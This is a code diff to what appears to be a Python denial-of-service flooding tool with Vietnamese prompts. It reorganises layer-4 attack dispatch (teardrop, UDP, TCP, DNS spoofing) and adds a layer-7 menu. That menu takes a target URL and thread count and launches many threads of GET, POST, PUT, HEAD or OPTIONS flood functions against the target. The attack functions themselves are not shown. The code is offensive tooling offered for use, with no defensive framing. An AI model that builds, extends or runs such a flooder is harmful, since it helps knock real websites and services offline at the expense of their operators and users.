@@ -212,11 +212,32 @@ if layer == "layer4":
     elif methods == "dns":
         for i in range(socketx):
             threading.Thread(target=dns_spoofing, args=(url_target,)).start()
-    elif methods == "tear":    for i in range(socketx):
-        threading.Thread(target=teardrop_attack, args=(url_target,)).start()
-elif methods == "udp":
-    for i in range(socketx):
-        threading.Thread(target=udp_attack, args=(url_target,)).start()
-elif methods == "tcp":
-    for i in range(socketx):
-        threading.Thread(target=tcp_attack, args=(url_target,)).start()
+    elif methods == "tear":
+        for i in range(socketx):
+            threading.Thread(target=teardrop_attack, args=(url_target,)).start()
+    elif methods == "udp":
+        for i in range(socketx):
+            threading.Thread(target=udp_attack, args=(url_target,)).start()
+    elif methods == "tcp":
+        for i in range(socketx):
+            threading.Thread(target=tcp_attack, args=(url_target,)).start()
+
+elif layer == "layer7":
+    url_target = input(bl + "[-] Nhập URL mục tiêu của bạn: ")
+    worker = int(input(mag + "[=] Nhập số lượng luồng: "))
+    methods = input(lgn + "[$] GET\n[$] POST\n[$] PUT\n[$] HEAD\n[$] OPTIONS\n\n[*] Nhập phương pháp: ")
+    if methods == "GET":
+        for x in range(worker):
+            threading.Thread(target=GET_attack, args=(url_target,)).start()
+    if methods == "POST":
+        for x in range(worker):
+            threading.Thread(target=POST_attack, args=(url_target,)).start()
+    if methods == "PUT":
+        for x in range(worker):
+            threading.Thread(target=PUT_attack, args=(url_target,)).start()
+    if methods == "HEAD":
+        for x in range(worker):
+            threading.Thread(target=HEAD_attack, args=(url_target,)).start()
+    if methods == "OPTIONS":
+        for x in range(worker):
+            threading.Thread(target=OPTIONS_attack, args=(url_target,)).start()
